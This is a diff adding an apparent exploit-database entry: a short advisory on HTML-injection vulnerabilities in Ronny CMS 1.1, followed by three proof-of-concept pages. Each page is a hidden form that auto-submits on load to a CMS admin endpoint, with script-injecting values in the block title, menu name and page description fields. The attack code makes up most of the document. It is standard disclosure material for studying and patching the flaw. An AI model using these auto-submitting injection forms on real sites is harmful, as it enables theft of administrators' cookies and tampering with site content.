@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/44066/info
+
+Ronny CMS is prone to multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+Ronny CMS 1.1 r935 is vulnerable; other versions may also be affected. 
+
+<form action="http://www.example.com/system/admin.php" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="bside" value="0" />
+<input type="hidden" name="bshow_template" value="standard" />
+<input type="hidden" name="bcmodule[]" value="-1" />
+<input type="hidden" name="bcmodule[]" value="0" />
+<input type="hidden" name="bcmodule[]" value="2" />
+<input type="hidden" name="bcmodule[]" value="3" />
+<input type="hidden" name="bvisible" value="0" />
+<input type="hidden" name="bweight" value="" />
+<input type="hidden" name="btitle" value='1"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="bcontent" value="" />
+<input type="hidden" name="bctype" value="H" />
+<input type="hidden" name="fct" value="blocksadmin" />
+<input type="hidden" name="op" value="save" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+
+
+<form action="http://www.example.com/menu/admin/index.php?op=saveItem" method="post" name="main" >
+
+<input type="hidden" name="menuid" value="1" />
+<input type="hidden" name="id" value="2" />
+<input type="hidden" name="pid" value="0" />
+<input type="hidden" name="name" value='Pages<script>alert(document.cookie)</script>' />
+<input type="hidden" name="url" value="/pages/" />
+<input type="hidden" name="order" value="20" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+
+
+
+<form action="http://www.example.com/pages/admin/index.php?op=editPage1" method="post" enctype="multipart/form-data" >
+
+<input type="hidden" name="pid" value="0" />
+<input type="hidden" name="pname" value="Page name" />
+<input type="hidden" name="purl" value="main" />
+<input type="hidden" name="ptemplate" value="index" />
+<input type="hidden" name="porder" value="0" />
+<input type="hidden" name="ptext" value="Ronny CMS page text" />
+<input type="hidden" name="pfile"; filename="" />
+<input type="hidden" name="pdesc" value='page description"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="pkeywords" value="page metas" />
+<input type="hidden" name="ptags" value="" />
+<input type="hidden" name="update_pid" value="1" />
+<input type="submit" id="btn" name="submit" value="SAVE" />
+
+</form>
+<script>
+document.getElementById('btn').click();
+</script>
